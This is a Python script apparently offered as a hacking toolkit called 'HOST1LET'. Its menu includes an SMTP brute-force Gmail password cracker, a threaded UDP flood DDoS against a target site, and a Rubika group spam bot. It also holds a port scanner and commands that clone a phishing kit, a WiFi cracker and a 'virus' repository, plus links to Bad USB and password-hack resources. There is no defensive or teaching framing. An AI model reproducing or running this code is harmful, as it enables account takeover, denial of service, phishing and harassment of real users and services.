from colorama import Fore as f 
from os import system 
import pyfiglet
import smtplib
from requests import get
from fuzzywuzzy import fuzz
from googlesearch import search
from arsein import Messenger
from bs4 import BeautifulSoup
from datetime import datetime
import time
import socket
from sketchpy import library as lib
import _thread
import pyfiglet
from colorama import Fore, Back, Style, init
import csv
import signal
import pandas as pd
import PIL
import crypto
import os
from os.path import abspath,basename,dirname,isdir,isfile,join
import platform
import re
import sys
from tarfile import open as taropen
from time import sleep, ctime, time
from signal import SIGINT, SIGILL, SIGTERM
from smtplib import SMTP_SSL as smtp
from socket import AF_INET ,SOCK_STREAM, setdefaulttimeout,socket
from subprocess import DEVNULL, PIPE, Popen, STDOUT, call, run
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from time import monotonic
import requests
from zipfile import ZipFile
from requests_futures.sessions import FuturesSession
from torrequest import TorRequest
from result import QueryStatus
from result import QueryResult
from importlib import import_module 
from glob import glob
from json import dumps, loads
from sites import SitesInformation
from colorama import init


system("cls")

text = "HOST1LET"

print(f"{f.YELLOW}"+pyfiglet.figlet_format(text, font='slant')+"\n"+f"{f.RED}_"*60)



print("")

print(f"{f.BLUE}[{f.RED}1{f.BLUE}] Gmail Cracker"+ f"               {f.BLUE}[{f.RED}2{f.BLUE}] Nmap Tools")
print("")
print(f"{f.BLUE}[{f.RED}3{f.BLUE}] Account User Finder"+ f"         {f.BLUE}[{f.RED}4{f.BLUE}] Search All Over The internet")
print("")
print(f"{f.BLUE}[{f.RED}5{f.BLUE}] Get Virus For Rubika"+ f"        {f.BLUE}[{f.RED}6{f.BLUE}] Time Now")
print("")
print(f"{f.BLUE}[{f.RED}7{f.BLUE}] Get Ip Server Of Host"+ f"       {f.BLUE}[{f.RED}8{f.BLUE}] WiFi Cracker")
print("")
print(f"{f.BLUE}[{f.RED}9{f.BLUE}] Max Phisher"+ f"                 {f.BLUE}[{f.RED}10{f.BLUE}] Bommber Bot RUBIKA")
print("")
print(f"{f.BLUE}[{f.RED}11{f.BLUE}] IP Tracker"+ f"                 {f.BLUE}[{f.RED}12{f.BLUE}] Ngrok Services")
print("")
print(f"{f.BLUE}[{f.RED}13{f.BLUE}] Unlimited Time"+ f"             {f.BLUE}[{f.RED}14{f.BLUE}] DDoS Attacker")
print("")
print(f"{f.BLUE}[{f.RED}15{f.BLUE}] Use Calculator"+ f"             {f.BLUE}[{f.RED}16{f.BLUE}] Port Scanner")
print("")
print(f"{f.BLUE}[{f.RED}17{f.BLUE}] Logo Maker"+ f"                 {f.BLUE}[{f.RED}18{f.BLUE}] Make Bad USB")
print("")
print(f"{f.BLUE}[{f.RED}19{f.BLUE}] Source Hack Pass Skyroom"+ f"   {f.BLUE}[{f.RED}20{f.BLUE}] Draw Robert Downey")
print("")
print(f"{f.BLUE}[{f.RED}21{f.BLUE}] Pass Generatod"+ f"             {f.BLUE}[{f.RED}22{f.BLUE}] Bot Uploader")
print("")
print(f"{f.BLUE}[{f.RED}23{f.BLUE}] Bot Seen Zan"+ f"               {f.BLUE}[{f.RED}24{f.BLUE}] Auth Dozd")
print("")
print("")
print("")
xx = int(input(f"{f.RED}set{f.WHITE}> "))


if xx == 1:
    gm = str(input(f"{f.BLUE}Enter Gmail With @gmail.com {f.WHITE}> "))
    pas_gm = str(input(f"{f.BLUE}Enter Your PassList Name {f.WHITE}> "))
    filehandler = open(pas_gm, 'r')
    for password in filehandler:
        server = smtplib.SMTP_SSL("stmp.gmail.com", 465)
        server.ehlo()
        try:
            server.login(gm,password)
            print(f"PassWord Of Account is {password}")
            break
        except smtplib.SMTPAuthenticationError:
            print("Wrong Credentials")
            print(f"Wrong Password is {password}")

elif xx == 2:
    print(f"{f.RED}Please Visit This Site >>> https://nmap.org")

elif xx == 3:
    system("git clone https://github.com/sherlock-project/sherlock")
    print("")
    print("""
    Please After That Write This : 
    cd sherlock
    pip install -r requirements.txt
    cd sherlock
    python sherlock.py""")

elif xx == 4:

    # colorama
    init(autoreset=True)

    # Logo
    print(Fore.YELLOW + '''
    █▀▄▀█ █▀▀█ █▀▀▀ █▀▄▀█ █▀▀█   █▀▀█ █▀▀ ░▀░ █▀▀▄ ▀▀█▀▀
    █░▀░█ █▄▄█ █░▀█ █░▀░█ █▄▄█   █░░█ ▀▀█ ▀█▀ █░░█ ░░█░░
    ▀░░░▀ ▀░░▀ ▀▀▀▀ ▀░░░▀ ▀░░▀   ▀▀▀▀ ▀▀▀ ▀▀▀ ▀░░▀ ░░▀░░
                                    Created by LimerBoy
    ''' )

    query   = input(Back.BLACK + Fore.YELLOW + 'Find > ' + Back.RESET + Fore.WHITE)
    results = 100

    print(Fore.GREEN + '[~] Searching ' + query)
    for url in search(query, stop = results):
        print('\n' + Fore.CYAN + '[+] Url detected: ' + url)
        try:
            text = get(url, timeout = 1).text
        except:
            continue
        soup = BeautifulSoup(text, "html.parser")
        links_detected = []
        try:
            print(Fore.MAGENTA + '[?] Title: ' + soup.title.text.replace('\n', ''))
        except:
            print(Fore.RED + '[?] Title: null')
        # Find by <a> tags
        try:
            for link in soup.findAll('a'):
                href = link['href']
                if not href in links_detected:
                    if href.startswith('http'):
                        # Filter
                        if url.split('/')[2] in href:
                            links_detected.append(href)
                        # If requested data found in url
                        elif query.lower() in href.lower():
                            print(Fore.GREEN + '--- Requested data found at link : ' + href)
                            links_detected.append(href)
                        # If text in link and link location is similar
                        elif fuzz.ratio(link.text, href) >= 60:
                            print(Fore.GREEN + '--- Text and link are similar : ' + href)
                            links_detected.append(href)
        except:
            continue
        if links_detected == []:
            print(Fore.RED + '--- No data found')




elif xx == 5:
    system("git clone https://huggingface.co/spaces/hs1l/FilLe")
    print("")
    print("""
    please Write That : 
    cd FilLe
    pip install -r requirements.txt
    python main.py""")

elif xx == 6:
    tmr = datetime.now()
    print(tmr.strftime("[ %H : %M : %S ]"))

elif xx == 7:
    gtping = str(input(f"{f.RED}Enter URL{f.WHITE}> "))
    ping = system(f"ping {gtping}")
    print(ping)
    


elif xx == 8:
    system("git clone https://github.com/derv82/wifite2")
    print(f"""
    {f.RED}Notice ! Your System Will Be Root {f.WHITE}
    Please After Clonning Write : 
    cd wifite2
    python Wifite.py""")

elif xx == 9:
    system("git clone https://github.com/KasRoudra/MaxPhisher")
    print("The Libraries Was Downloaded")
    print("""
    Please Write That : 
    cd MaxPhisher
    python maxphisher.py""")

elif xx == 10:
    from arsein import Messenger 
    from colorama import Fore as f
    from datetime import datetime
    from os import system 
    import pyfiglet 


    timer = datetime.now()
    system("clear")

    uu = pyfiglet.figlet_format(text="Bommber", font="small")
    print("\n")

    iu = pyfiglet.figlet_format(text="                                       Gap", font="small")+"\n"+f"{f.BLUE}-"*60+"\n"

    print(f.YELLOW, uu, iu)


    print(f"""{f.RED} ├𝑩𝒐𝒎𝒎𝒃𝒆𝒓 𝑮𝒂𝒑{f.CYAN} 𝑹𝑼𝑩𝑰𝑲𝑨
    {f.RED} ├𝑪𝒓𝒆𝒂𝒕𝒐𝒓 {f.BLUE}host1let{f.RED}""")
    
    print("\n")

    auth = str(input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter Auth {f.RED}>>>{f.YELLOW} "))

    print("")

    link = str(input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter The Link Gap {f.RED}>>>{f.YELLOW} "))

    print("")

    msg = str(input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter The Message Will Be Send To Gap {f.RED}>>>{f.YELLOW} "))

    print("")

    bot = Messenger(auth)

    group_name=bot.joinGroup(link)['data']['group']['group_title']


    group_member=bot.joinGroup(link)['data']['group']['count_members']

    guid = bot.joinGroup(link)['data']['group']['group_guid']


    print(f"{f.BLUE}[{f.RED}+{f.BLUE}] Group name {f.RED}:{f.YELLOW} {group_name}")

    print("")

    print(f"{f.BLUE}[{f.RED}+{f.BLUE}] Group guid{f.RED} : {f.YELLOW}{guid}")
    print("")

    print(f"{f.BLUE}[{f.RED}+{f.BLUE}] Group members{f.RED} : {f.YELLOW}{group_member}")

    print("")

    num = 0

    while (1):
        time = datetime.now()
        num += 1
        guid = bot.joinGroup(link)['data']['group']['group_guid']
        print(time.strftime(f'{f.BLUE}[{f.RED}!{f.BLUE}] TIME {f.RED}: '+f"{f.BLUE}[ {f.YELLOW}%H {f.BLUE}: {f.YELLOW}%M {f.BLUE}: {f.YELLOW}%S {f.BLUE}]"))
        print("")
        print(f"{f.BLUE}[{f.RED}*{f.BLUE}] {f.RED}Join")
        bot.sendMessage(guid,msg)
        print(f"{f.BLUE}[{f.RED}*{f.BLUE}]{f.YELLOW} Message Was Sended To Gap {f.RED}{num}")
        bot.leaveGroup(guid)
        print(f"{f.BLUE}[{f.RED}+{f.BLUE}]{f.GREEN} Left The Gap")
        print(f"{f.MAGENTA}-"*50)
        print("")
        

elif xx == 11:
    system("git clone https://github.com/htr-tech/track-ip") 
    print("""
    Please Afret Clonning Write : 
    cd track-ip
    bash trackip""")

elif xx == 12:
    print("https://ngrok.com")

elif xx == 13:
    untime = datetime.now()
    print(untime.strftime("[ %H : %M : %S ]"))
    sleep(1)
    system("cls")

elif xx == 14:


    system("cls")

    text="HOST1LET"

    print('\033[31m'+pyfiglet.figlet_format(text,font='slant')+"\n"+'\033[34m'+"_"*60+'\033[00m')

    print("")
    site = input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter your site url {f.RED}=>{f.YELLOW} ")
    thread_count = input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter your thread {f.RED}=>{f.YELLOW} ")
    msg = str(input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter Your Message Will Be Send To Your Target {f.RED}=>{f.YELLOW} "))
    ip = socket.gethostbyname(site)
    UDP_PORT = 80
    MESSAGE = msg
    print("")
    print(f"{f.BLUE}UDP target IP {f.RED}>>> {f.YELLOW}{ip}")
    print("")
    print(f"{f.BLUE}UDP target port {f.RED}>>> {f.YELLOW}{UDP_PORT}")
    print("")
    time.sleep(3)
    def ddos(i):
        while 1:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
            print(f"{f.BLUE}Packet Sent")
    for i in range(int(thread_count)):
        try:
            _thread.start_new_thread(ddos, ("Thread-" + str(i),))
        except KeyboardInterrupt:
            sys.exit(0)
    while 1:
        pass

elif xx == 15:
    


    def add(x, y):
        return x + y


    def subtract(x, y):
        return x - y


    def multiply(x, y):
        return x * y


    def divide(x, y):
        return x / y


    print("Select operation.")
    print("1.Add")
    print("2.Subtract")
    print("3.Multiply")
    print("4.Divide")

    while True:
        
        choice = input("Enter choice(1/2/3/4): ")


        if choice in ('1', '2', '3', '4'):
            num1 = float(input("first number => "))
            num2 = float(input("second number => "))

            if choice == '1':
                print(num1, "+", num2, "=", add(num1, num2))

            elif choice == '2':
                print(num1, "-", num2, "=", subtract(num1, num2))

            elif choice == '3':
                print(num1, "*", num2, "=", multiply(num1, num2))

            elif choice == '4':
                print(num1, "/", num2, "=", divide(num1, num2))
            
    
            next_calculation = input("Let's do next calculation? (yes/no): ")
            if next_calculation == "no":
                break
        
        else:
            print("Invalid Input")  

elif xx == 16:
    system("cls")

    text="HOST1LET"

    print('\033[31m'+pyfiglet.figlet_format(text,font='slant')+"\n"+'\033[34m'+"_"*60+'\033[00m')


    init(autoreset=True)

    if len(sys.argv) != 2:
        print("USAGE: python port-scanner.py <url-ip>")
    else:
        ip = sys.argv[1]
        for port in range(65536):
            print(f"{Fore.YELLOW}Testing port > {Fore.RED}{port}", end="\r")
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
                    connection.settimeout(0.5)
                    connection.connect((ip, port))
                    print(f"{Fore.LIGHTBLUE_EX}this port is open {Fore.RED}{port}")
            except:
                pass

elif xx == 17:
    name = str(input(f"{f.RED}Enter a Name{f.WHITE}> "))
    font = str(input(f"{f.RED}Please Enter a Font{f.BLUE}For More INFO [https://gist.github.com/Technetium1/f97474f52096303d556963d37f59edee]{f.WHITE}> "))
    banner = pyfiglet.figlet_format(text=name, font=font)
    print(banner)

elif xx == 18:
    print("Check This Link 😉  https://github.com/MR369MR/knife")

elif xx == 19:
    print("Check This Link 😉  https://t.me/MR_369_963/1321")

elif xx == 20:
    obj = lib.rdj()
    obj.draw() 

elif xx == 21:
    system("git clone https://github.com/Zrexer/PassGen")
    print("""
    Please After Clonning Write : 
    cd PassGen
    pip install -r requirements.txt
    python pass.py""")

elif xx == 22:
    print("Will Be Soon . . .")


elif xx == 23:
    print("Will Be Soon . . .")


elif xx == 24:
    print("Will Be Soon . . .")
